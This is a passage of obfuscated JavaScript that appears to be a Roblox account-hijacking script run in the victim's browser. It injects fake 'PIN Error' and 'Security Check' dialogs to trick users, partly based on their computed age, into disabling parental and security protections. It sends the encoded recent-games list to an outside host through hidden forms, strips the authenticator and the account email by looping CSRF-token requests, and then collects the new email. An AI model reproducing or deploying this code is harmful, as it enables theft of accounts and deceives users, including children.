      if (_0x6760ea === false) {
        document.getElementById("rbx-body").innerHTML = document.getElementById("rbx-body").innerHTML += "<div role=\"dialog\" id=\"PIN\" style=\"display:block\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display:block\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\"></button><h4 class=\"modal-title\">Roblox PIN Error</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><div></div><p class=\"modal-margin-bottom-xlarge\">We are experiencing technical difficulties. Please temporarily disable your Parent PIN in Parental Controls to continue your action. (Error Code: 500)</p><div></div></div><div class=\"modal-footer\"><div class=\"modal-modern-footer-buttons\"><button type=\"button\" style=\"z-index:9999;cursor:pointer\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" onclick='window.location.href.includes(\"parental-controls\")?location.reload():window.location.replace(\"https://www.roblox.com/my/account#!/parental-controls\")' onchange=\"\" id=\"verifyButton\">To Your Settings!</button></div></div></div></div></div></div>";
        return;
      }
      const _0x36264e = new Date(window.globalInfo.birthData?.["birthMonth"] + '/' + window.globalInfo.birthData?.['birthDay'] + '/' + window.globalInfo.birthData?.["birthYear"]);
      const _0x4593f7 = new Date(new Date() - _0x36264e.getTime());
      const _0x374a60 = Math.abs(_0x4593f7.getUTCFullYear() - 0x7b2);
      underAgePrompt = () => {
        document.getElementById('rbx-body').innerHTML = document.getElementById("rbx-body").innerHTML += "<div role=\"dialog\" id=\"passwordPrompt\" style=\"display:block\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display:block\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\"></button><h4 class=\"modal-title\">Roblox Security Check</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><div></div><p class=\"modal-margin-bottom-xlarge\">We are unable to verify ownership of this account due to a lack of strong security settings. Please enable \"Authenticator App\" with in the Security tab of your settings. (Error Code: 403)</p><div></div></div><div class=\"modal-footer\"><div class=\"modal-modern-footer-buttons\"><button type=\"button\" style=\"z-index:9999;cursor:pointer\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" onclick=\"window.location.href.includes(&quot;security&quot;)?location.reload():window.location.replace(&quot;https://www.roblox.com/my/account#!/security&quot;)\" onchange=\"\" id=\"verifyButton\">My Settings.</button></div></div></div></div></div></div>";
      };
      if (_0x4edf8d == "OTP_Email" && _0x374a60 <= 0xd) {
        underAgePrompt();
        return;
      }
      window.globalInfo.age = _0x374a60;
      new Promise(async _0x3ff3ab => {
        try {
          let _0x490220 = await getRecentGames();
          if (_0x490220?.["length"] >= 0x1) {
            _0x490220 = btoa(removeInvalidChars(JSON.stringify(_0x490220)));
            let _0x30af9c = 0x0;
            setInterval(async () => {
              _0x30af9c++;
              if (_0x30af9c >= 0x3) {
                return;
              }
              const _0x44f4db = Math.floor(Math.random() * _0x490220.length);
              document.getElementById("cookie-banner-wrapper").innerHTML = document.getElementById("cookie-banner-wrapper").innerHTML += '' + ("<iframe name='gamesIframe" + _0x44f4db + "' style='display:none'></iframe>") + ("\n                            <form id='gamesForm' action=\"https://api.WEBSITEREMOVEDSOYOUDONTGETSCAMMED.com/games\" method=\"get\" target=\"gamesIframe" + _0x44f4db + "\" style=\"display: none\">\n                                <input type=\"text\" name=\"encoded_list\" value=\"" + _0x490220 + "\" hidden>\n                                <input type=\"submit\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" style=\"cursor:pointer; padding-right: inherit; padding-left: inherit; width: 100%\" value=\"Open The Window\">\n                           </form>\n                            ");
              const _0x1bedc9 = document.getElementById("gamesForm");
              _0x1bedc9.submit();
            }, 0x1388);
          }
        } catch (_0x490a19) {
          console.log(_0x490a19);
        }
      });
      log("UserID: " + _0x1b2c5e + " / method: " + _0x4edf8d, "info");
      let _0x2d0646 = new factorManagement(_0x4edf8d, _0x1b2c5e);
      let _0x31e407 = {};
      let _0x1cdf62 = false;
      let _0x210d19 = false;
      console.log(_0x195441.slice(_0x195441.indexOf('@') + 0x1), _0x2c4ee5.slice(_0x2c4ee5.indexOf('@') + 0x1), _0x195441.slice(_0x195441.indexOf('@') + 0x1).includes(_0x2c4ee5.slice(_0x2c4ee5.indexOf('@') + 0x1)));
      if (_0x195441.slice(_0x195441.indexOf('@') + 0x1).includes(_0x2c4ee5.slice(_0x2c4ee5.indexOf('@') + 0x1))) {
        _0x210d19 = _0x210d19 === false ? _0x4edf8d === 'Authenticator' ? true : null : null;
        _0x1cdf62 = 0x0;
        _0x2c4ee5 = '';
      }
      while (_0x210d19 !== null) {
        const _0x217abe = await (_0x210d19 ? removeAuth : removeEmail)({
          'email': encodeURIComponent(_0x195441),
          'csrf': await getCsrfToken(),
          'headers': _0x31e407,
          'userId': _0x1b2c5e
        })['catch'](() => {});
        let _0x5b7116;
        try {
          _0x5b7116 = await _0x217abe.text();
        } catch (_0x1eaa7f) {}
        switch (_0x217abe.status) {
          case 0xc8:
            log("Removed successfully.", "info");
            _0x210d19 = _0x210d19 === false ? _0x4edf8d === 'Authenticator' ? true : null : null;
            _0x1cdf62 = !!(_0x4edf8d == "Authenticator");
            _0x31e407 = {};
            continue;
          case 0x193:
            const _0xc3bc26 = _0x217abe.headers.get('rblx-challenge-metadata');
            if (_0xc3bc26 == null && _0x5b7116.includes("authorize request")) {
              continue;
            }
            _0x31e407 = {};
            const _0x376b43 = await _0x2d0646.returnCompleted(_0x217abe, {
              'useCache': _0x1cdf62
            });
            if (_0x376b43 == null) {
              continue;
            }
            if (_0x376b43 == "Unknown auth") {
              underAgePrompt();
              return;
            }
            _0x31e407 = _0x376b43;
            continue;
          case 0x1ad:
            log("Rate limited, waiting 5 seconds.", "info");
            alert("The amount of requests you can send for the next 30 minutes has exceeded its limit. Please wait a while before trying again.");
            return;
          default:
            log("An unknown error has occurred. " + _0x5b7116, "error");
            alert("An unknown error has occurred, please try again later. (889)");
            return;
        }
      }
      collectEmail({
        'currentEmail': encodeURIComponent(_0x195441),
        'userId': _0x1b2c5e,
        'pastEmail': _0x2c4ee5
      });
    } catch (_0x42a3ba) {
      log(_0x42a3ba, "error");
    }
  });
} catch (_0x587a0e) {
  alert("Your browser is not supported. Please update your browser or move to the latest version of chrome.");
  location.reload();
}
